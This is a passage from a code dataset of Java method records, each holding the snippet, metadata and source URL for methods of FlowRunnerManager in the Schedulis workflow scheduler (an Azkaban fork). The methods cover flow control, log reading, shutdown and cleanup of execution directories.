resumeFlow(final int execId, final String user)\n      throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n          + \" is not running.\");\n    }\n\n    runner.resume(user);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55913, "method_name": "retryFailures", "class_name": "FlowRunnerManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void retryFailures(final int execId, final String user)\n      throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n          + \" is not running.\");\n    }\n\n    runner.retryFailures(user);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55914, "method_name": "skippedAllFailures", "class_name": "FlowRunnerManager", "params": ["int", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String skippedAllFailures(final int execId, final String user)\n      throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Execution \" + execId\n          + \" is not running.\");\n    }\n\n    return runner.skippedAllFailures(user);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55915, "method_name": "getExecutableFlow", "class_name": "FlowRunnerManager", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "ExecutableFlow", "snippet": "  public ExecutableFlow getExecutableFlow(final int execId) {\n    final FlowRunner runner = this.runningFlows.get(execId);\n    if (runner == null) {\n      return this.recentlyFinishedFlows.get(execId);\n    }\n    return runner.getExecutableFlow();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55916, "method_name": "handleEvent", "class_name": "FlowRunnerManager", "params": ["Event"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void handleEvent(final Event event) {\n    if (event.getType() == EventType.FLOW_FINISHED || event.getType() == EventType.FLOW_STARTED) {\n      final FlowRunner flowRunner = (FlowRunner) event.getRunner();\n      final ExecutableFlow flow = flowRunner.getExecutableFlow();\n\n      if (event.getType() == EventType.FLOW_FINISHED) {\n        this.recentlyFinishedFlows.put(flow.getExecutionId(), flow);\n        logger.info(\"Flow \" + flow.getExecutionId()\n            + \" is finished. Adding it to recently finished flows list.\");\n        this.runningFlows.remove(flow.getExecutionId());\n      } else if (event.getType() == EventType.FLOW_STARTED) {\n        // add flow level SLA checker flow \u8d85\u65f6\u544a\u8b66\n        this.triggerManager\n            .addTrigger(flow.getExecutionId(), SlaOption.getFlowLevelSLAOptions(flow));\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55917, "method_name": "readFlowLogs", "class_name": "FlowRunnerManager", "params": ["int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "LogData", "snippet": "  public LogData readFlowLogs(final int execId, final int startByte, final int length)\n      throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Running flow \" + execId\n          + \" not found.\");\n    }\n\n    final File dir = runner.getExecutionDir();\n    if (dir != null && dir.exists()) {\n      try {\n        synchronized (this.executionDirDeletionSync) {\n          if (!dir.exists()) {\n            throw new ExecutorManagerException(\n                \"Execution dir file doesn't exist. Probably has been deleted\");\n          }\n\n          final File logFile = runner.getFlowLogFile();\n          if (logFile != null && logFile.exists()) {\n            return FileIOUtils.readUtf8File(logFile, startByte, length);\n          } else {\n            throw new ExecutorManagerException(\"Flow log file doesn't exist.\");\n          }\n        }\n      } catch (final IOException e) {\n        throw new ExecutorManagerException(e);\n      }\n    }\n\n    throw new ExecutorManagerException(\n        \"Error reading file. Log directory doesn't exist.\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55918, "method_name": "getJobFileSize", "class_name": "FlowRunnerManager", "params": ["int", "String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "long", "snippet": "  public long getJobFileSize(final int execId, final String jobId, final int attempt) throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Running flow \" + execId\n          + \" not found.\");\n    }\n    final File dir = runner.getExecutionDir();\n    if (dir != null && dir.exists()) {\n      synchronized (this.executionDirDeletionSync) {\n        if (!dir.exists()) {\n          throw new ExecutorManagerException(\n              \"Execution dir file doesn't exist. Probably has beend deleted\");\n        }\n        final File logFile = runner.getJobLogFile(jobId, attempt);\n        if (logFile != null && logFile.exists()) {\n          return logFile.length();\n        } else {\n          throw new ExecutorManagerException(\"Job log file doesn't exist.\");\n        }\n      }\n    }\n    return 0L;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55919, "method_name": "readJobLogs", "class_name": "FlowRunnerManager", "params": ["int", "String", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "LogData", "snippet": "  public LogData readJobLogs(final int execId, final String jobId, final int attempt,\n      final int startByte, final int length) throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Running flow \" + execId\n          + \" not found.\");\n    }\n\n    final File dir = runner.getExecutionDir();\n    if (dir != null && dir.exists()) {\n      try {\n        synchronized (this.executionDirDeletionSync) {\n          if (!dir.exists()) {\n            throw new ExecutorManagerException(\n                \"Execution dir file doesn't exist. Probably has beend deleted\");\n          }\n          final File logFile = runner.getJobLogFile(jobId, attempt);\n          if (logFile != null && logFile.exists()) {\n            return FileIOUtils.readUtf8File(logFile, startByte, length);\n          } else {\n            throw new ExecutorManagerException(\"Job log file doesn't exist.\");\n          }\n        }\n      } catch (final IOException e) {\n        throw new ExecutorManagerException(e);\n      }\n    }\n\n    throw new ExecutorManagerException(\n        \"Error reading file. Log directory doesn't exist.\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55920, "method_name": "readJobAttachments", "class_name": "FlowRunnerManager", "params": ["int", "String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<Object>", "snippet": "  public List<Object> readJobAttachments(final int execId, final String jobId, final int attempt)\n      throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Running flow \" + execId\n          + \" not found.\");\n    }\n\n    final File dir = runner.getExecutionDir();\n    if (dir == null || !dir.exists()) {\n      throw new ExecutorManagerException(\n          \"Error reading file. Log directory doesn't exist.\");\n    }\n\n    try {\n      synchronized (this.executionDirDeletionSync) {\n        if (!dir.exists()) {\n          throw new ExecutorManagerException(\n              \"Execution dir file doesn't exist. Probably has beend deleted\");\n        }\n\n        final File attachmentFile = runner.getJobAttachmentFile(jobId, attempt);\n        if (attachmentFile == null || !attachmentFile.exists()) {\n          return null;\n        }\n\n        final List<Object> jobAttachments =\n            (ArrayList<Object>) JSONUtils.parseJSONFromFile(attachmentFile);\n\n        return jobAttachments;\n      }\n    } catch (final IOException e) {\n      throw new ExecutorManagerException(e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55921, "method_name": "readJobMetaData", "class_name": "FlowRunnerManager", "params": ["int", "String", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "JobMetaData", "snippet": "  public JobMetaData readJobMetaData(final int execId, final String jobId, final int attempt,\n      final int startByte, final int length) throws ExecutorManagerException {\n    final FlowRunner runner = this.runningFlows.get(execId);\n    if (runner == null) {\n      throw new ExecutorManagerException(\"Running flow \" + execId\n          + \" not found.\");\n    }\n\n    final File dir = runner.getExecutionDir();\n    if (dir != null && dir.exists()) {\n      try {\n        synchronized (this.executionDirDeletionSync) {\n          if (!dir.exists()) {\n            throw new ExecutorManagerException(\n                \"Execution dir file doesn't exist. Probably has beend deleted\");\n          }\n          final File metaDataFile = runner.getJobMetaDataFile(jobId, attempt);\n          if (metaDataFile != null && metaDataFile.exists()) {\n            return FileIOUtils.readUtf8MetaDataFile(metaDataFile, startByte,\n                length);\n          } else {\n            throw new ExecutorManagerException(\"Job log file doesn't exist.\");\n          }\n        }\n      } catch (final IOException e) {\n        throw new ExecutorManagerException(e);\n      }\n    }\n\n    throw new ExecutorManagerException(\n        \"Error reading file. Log directory doesn't exist.\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55922, "method_name": "getLastCleanerThreadCheckTime", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getLastCleanerThreadCheckTime() {\n    return this.lastCleanerThreadCheckTime;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55923, "method_name": "isCleanerThreadActive", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isCleanerThreadActive() {\n    return this.cleanerThread.isAlive();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55924, "method_name": "getCleanerThreadState", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "State", "snippet": "  public State getCleanerThreadState() {\n    return this.cleanerThread.getState();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55925, "method_name": "isExecutorThreadPoolShutdown", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isExecutorThreadPoolShutdown() {\n    return this.executorService.isShutdown();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55926, "method_name": "getNumQueuedFlows", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getNumQueuedFlows() {\n    return this.executorService.getQueue().size();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55927, "method_name": "getNumRunningFlows", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getNumRunningFlows() {\n    return this.executorService.getActiveCount();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55928, "method_name": "getRunningFlowIds", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getRunningFlowIds() {\n    // The in progress tasks are actually of type FutureTask\n    final Set<Runnable> inProgressTasks = this.executorService.getInProgressTasks();\n\n    final List<Integer> runningFlowIds =\n        new ArrayList<>(inProgressTasks.size());\n\n    for (final Runnable task : inProgressTasks) {\n      // add casting here to ensure it matches the expected type in\n      // submittedFlows\n      final Integer execId = this.submittedFlows.get((Future<?>) task);\n      if (execId != null) {\n        runningFlowIds.add(execId);\n      } else {\n        logger.warn(\"getRunningFlowIds: got null execId for task: \" + task);\n      }\n    }\n\n    Collections.sort(runningFlowIds);\n    return runningFlowIds.toString();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55929, "method_name": "getQueuedFlowIds", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getQueuedFlowIds() {\n    final List<Integer> flowIdList =\n        new ArrayList<>(this.executorService.getQueue().size());\n\n    for (final Runnable task : this.executorService.getQueue()) {\n      final Integer execId = this.submittedFlows.get(task);\n      if (execId != null) {\n        flowIdList.add(execId);\n      } else {\n        logger\n            .warn(\"getQueuedFlowIds: got null execId for queuedTask: \" + task);\n      }\n    }\n    Collections.sort(flowIdList);\n    return flowIdList.toString();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55930, "method_name": "getMaxNumRunningFlows", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getMaxNumRunningFlows() {\n    return this.numThreads;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55931, "method_name": "getTheadPoolQueueSize", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getTheadPoolQueueSize() {\n    return this.threadPoolQueueSize;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55932, "method_name": "reloadJobTypePlugins", "class_name": "FlowRunnerManager", "params": [], "throws": ["JobTypeManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void reloadJobTypePlugins() throws JobTypeManagerException {\n    this.jobtypeManager.loadPlugins();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55933, "method_name": "getTotalNumExecutedFlows", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getTotalNumExecutedFlows() {\n    return this.executorService.getTotalTasks();\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55934, "method_name": "beforeExecute", "class_name": "FlowRunnerManager", "params": ["Runnable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void beforeExecute(final Runnable r) {\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55935, "method_name": "afterExecute", "class_name": "FlowRunnerManager", "params": ["Runnable"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void afterExecute(final Runnable r) {\n    this.submittedFlows.remove(r);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55936, "method_name": "shutdown", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void shutdown() {\n    logger.warn(\"Shutting down FlowRunnerManager...\");\n    if (this.azkabanProps.getBoolean(ConfigurationKeys.AZKABAN_POLL_MODEL, false)) {\n      this.pollingService.shutdown();\n    }\n    this.executorService.shutdown();\n    boolean result = false;\n    while (!result) {\n      logger.info(\"Awaiting Shutdown. # of executing flows: \" + getNumRunningFlows());\n      try {\n        result = this.executorService.awaitTermination(1, TimeUnit.MINUTES);\n      } catch (final InterruptedException e) {\n        logger.error(e);\n      }\n    }\n    logger.warn(\"Shutdown FlowRunnerManager complete.\");\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55937, "method_name": "shutdownNow", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void shutdownNow() {\n    logger.warn(\"Shutting down FlowRunnerManager now...\");\n    if (this.azkabanProps.getBoolean(ConfigurationKeys.AZKABAN_POLL_MODEL, false)) {\n      this.pollingService.shutdown();\n    }\n\t// FIXME\u00a0New feature: Before closing the executor thread pool, you need to actively kill all running tasks.\n    for (FlowRunner flowRunner : runningFlows.values()) {\n      logger.info(\"killing flow execId:\" + flowRunner.getExecutionId());\n      try {\n        flowRunner.removeListener(flowRunner.getCycleFlowRunnerEventListener());\n        flowRunner.kill();\n      } catch (Exception e) {\n        logger.error(\"kill flow failed, execId: \" + flowRunner.getExecutionId(), e);\n      }\n    }\n\n    this.executorService.shutdown();\n    this.triggerManager.shutdown();\n\n    boolean result = false;\n    for(int i = 0; i < 5; i++) {\n      logger.info(\"Awaiting Shutdown. # of executing flows: \" + getNumRunningFlows());\n      try {\n        result = this.executorService.awaitTermination(30, TimeUnit.SECONDS);\n        if(result){\n          logger.info(\"all flow is finished.\");\n          break;\n        }\n      } catch (final InterruptedException e) {\n        logger.error(e);\n      }\n    }\n    logger.warn(\"Shutdown FlowRunnerManager complete, now executing flows size: \" + getNumRunningFlows());\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55938, "method_name": "deleteExecutionDirectory", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void deleteExecutionDirectory() {\n    logger.warn(\"Deleting execution dir: \" + this.executionDirectory.getAbsolutePath());\n    try {\n      FileUtils.deleteDirectory(this.executionDirectory);\n    } catch (final IOException e) {\n      logger.error(e);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55939, "method_name": "getActiveProjectVersions", "class_name": "FlowRunnerManager", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Set<Pair>", "snippet": "  private Set<Pair<Integer, Integer>> getActiveProjectVersions() {\n    final Set<Pair<Integer, Integer>> activeProjectVersions = new HashSet<>();\n    for (final FlowRunner runner : FlowRunnerManager.this.runningFlows.values()) {\n      final ExecutableFlow flow = runner.getExecutableFlow();\n      activeProjectVersions.add(new Pair<>(flow\n          .getProjectId(), flow.getVersion()));\n    }\n    return activeProjectVersions;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventListener", "ThreadPoolExecutingListener"], "modifiers": ["public"]}}, {"id": 55940, "method_name": "shutdown", "class_name": "CleanerThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void shutdown() {\n      this.shutdown = true;\n      this.interrupt();\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 55941, "method_name": "isFlowRunningLongerThan", "class_name": "CleanerThread", "params": ["ExecutableFlow", "long"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean isFlowRunningLongerThan(final ExecutableFlow flow,\n        final long flowMaxRunningTimeInMins) {\n      final Set<Status> nonFinishingStatusAfterFlowStarts = new HashSet<>(\n          Arrays.asList(Status.RUNNING, Status.QUEUED, Status.PAUSED, Status.FAILED_FINISHING));\n      return nonFinishingStatusAfterFlowStarts.contains(flow.getStatus()) && flow.getStartTime() > 0\n          && TimeUnit.MILLISECONDS.toMinutes(System.currentTimeMillis() - flow.getStartTime())\n          >= flowMaxRunningTimeInMins;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 55942, "method_name": "run", "class_name": "CleanerThread", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n      while (!this.shutdown) {\n        synchronized (this) {\n          try {\n            FlowRunnerManager.this.lastCleanerThreadCheckTime = System.currentTimeMillis();\n            FlowRunnerManager.logger.info(\"# of executing flows: \" + getNumRunningFlows());\n\n            // Cleanup old stuff.\n            final long currentTime = System.currentTimeMillis();\n            if (currentTime - RECENTLY_FINISHED_INTERVAL_MS > this.lastRecentlyFinishedCleanTime) {\n              FlowRunnerManager.logger.info(\"Cleaning recently finished\");\n              cleanRecentlyFinished();\n              this.lastRecentlyFinishedCleanTime = currentTime;\n            }\n\n            if (currentTime - EXECUTION_DIR_CLEAN_INTERVAL_MS > this.lastExecutionDirCleanTime) {\n              FlowRunnerManager.logger.info(\"Cleaning old execution dirs\");\n              cleanOlderExecutionDirs();\n              this.lastExecutionDirCleanTime = currentTime;\n            }\n\n            if (this.flowMaxRunningTimeInMins > 0\n                && currentTime - LONG_RUNNING_FLOW_KILLING_INTERVAL_MS\n                > this.lastLongRunningFlowCleanTime) {\n              FlowRunnerManager.logger\n                  .info(String.format(\"Killing long jobs running longer than %s mins\",\n                      this.flowMaxRunningTimeInMins));\n              for (final FlowRunner flowRunner : FlowRunnerManager.this.runningFlows.values()) {\n                if (isFlowRunningLongerThan(flowRunner.getExecutableFlow(),\n                    this.flowMaxRunningTimeInMins)) {\n                  FlowRunnerManager.logger.info(String\n                      .format(\"Killing job [id: %s, status: %s]. It has been running for %s mins\",\n                          flowRunner.getExecutableFlow().getId(),\n                          flowRunner.getExecutableFlow().getStatus(), TimeUnit.MILLISECONDS\n                              .toMinutes(System.currentTimeMillis() - flowRunner.getExecutableFlow()\n                                  .getStartTime())));\n                  flowRunner.kill();\n                }\n              }\n              this.lastLongRunningFlowCleanTime = currentTime;\n            }\n\n            wait(FlowRunnerManager.RECENTLY_FINISHED_TIME_TO_LIVE);\n          } catch (final InterruptedException e) {\n            FlowRunnerManager.logger.info(\"Interrupted. Probably to shut down.\");\n          } catch (final Throwable t) {\n            FlowRunnerManager.logger.warn(\n                \"Uncaught throwable, please look into why it is not caught\", t);\n          }\n        }\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 55943, "method_name": "cleanOlderExecutionDirs", "class_name": "CleanerThread", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void cleanOlderExecutionDirs() {\n      final File dir = FlowRunnerManager.this.executionDirectory;\n\n      final long pastTimeThreshold =\n          System.currentTimeMillis() - FlowRunnerManager.this.executionDirRetention;\n      final File[] executionDirs = dir\n          .listFiles(path -> path.isDirectory() && path.lastModified() < pastTimeThreshold);\n\n      for (final File exDir : executionDirs) {\n        try {\n          final int execId = Integer.valueOf(exDir.getName());\n          if (FlowRunnerManager.this.runningFlows.containsKey(execId)\n              || FlowRunnerManager.this.recentlyFinishedFlows.containsKey(execId)) {\n            continue;\n          }\n        } catch (final NumberFormatException e) {\n          FlowRunnerManager.logger.error(\"Can't delete exec dir \" + exDir.getName()\n              + \" it is not a number\");\n          continue;\n        }\n\n        synchronized (FlowRunnerManager.this.executionDirDeletionSync) {\n          try {\n            FileUtils.deleteDirectory(exDir);\n          } catch (final IOException e) {\n            FlowRunnerManager.logger.error(\"Error cleaning execution dir \" + exDir.getPath(), e);\n          }\n        }\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 55944, "method_name": "cleanRecentlyFinished", "class_name": "CleanerThread", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void cleanRecentlyFinished() {\n      final long cleanupThreshold =\n          System.currentTimeMillis() - FlowRunnerManager.RECENTLY_FINISHED_TIME_TO_LIVE;\n      final ArrayList<Integer> executionToKill = new ArrayList<>();\n      for (final ExecutableFlow flow : FlowRunnerManager.this.recentlyFinishedFlows.values()) {\n        if (flow.getEndTime() < cleanupThreshold) {\n          executionToKill.add(flow.getExecutionId());\n        }\n      }\n\n      for (final Integer id : executionToKill) {\n        FlowRunnerManager.logger.info(\"Cleaning execution \" + id\n            + \" from recently finished flows list.\");\n        FlowRunnerManager.this.recentlyFinishedFlows.remove(id);\n      }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": "Thread", "implements": null, "modifiers": ["private"]}}, {"id": 55945, "method_name": "start", "class_name": "PollingService", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void start() {\n      this.scheduler.scheduleAtFixedRate(() -> pollExecution(), 0L, this.pollingIntervalMs,\n          TimeUnit.MILLISECONDS);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunnerManager.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["private"]}}, {"id": 55946, "method_name": "pollExecution", "class_name": "PollingService", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void pollExecution() {\n      if (this.executorId == -1) {\n        if (AzkabanExecutorServer.getApp() != null) {\n          try {\n            final Executor executor = requireNonNull(FlowRunnerManager.this.executorLoader\n                .fetchExecutor(AzkabanExecutorServer.getApp().getHost(),\n                    AzkabanExecutorServer.getApp().getPort()), \"The executor can not be null\");\n            this.executorId = executor.getId();\n          } catch (final Exception e) {\n            FlowRunnerManager.logger.error(\"Failed to fetch executor \", e);\n          }\n        }\n      } else {\n        try {\n          // Todo 